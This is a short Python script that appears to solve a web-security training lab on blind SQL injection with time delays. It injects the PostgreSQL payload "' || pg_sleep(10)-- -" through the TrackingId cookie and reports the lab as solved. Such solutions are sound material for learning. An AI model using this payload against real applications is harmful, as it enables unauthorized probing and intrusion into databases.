################################################################################
#
# Lab: Blind SQL injection with time delays
#
# Hack Steps: 
#      1. Inject payload into 'TrackingId' cookie to cause a 10 seconds delay
#      2. Wait for the response
#
################################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a6000c60338c7408016b223002c0020.web-security-academy.net"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "TrackingId")
    print(Fore.WHITE + "❯❯ Injecting payload to cause a 10 seconds delay.. ", end="", flush=True)

    payload = "' || pg_sleep(10)-- -"
    cookies = { "TrackingId": payload }

    try:  
       requests.get(f"{LAB_URL}/filter?category=Pets", cookies=cookies)
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
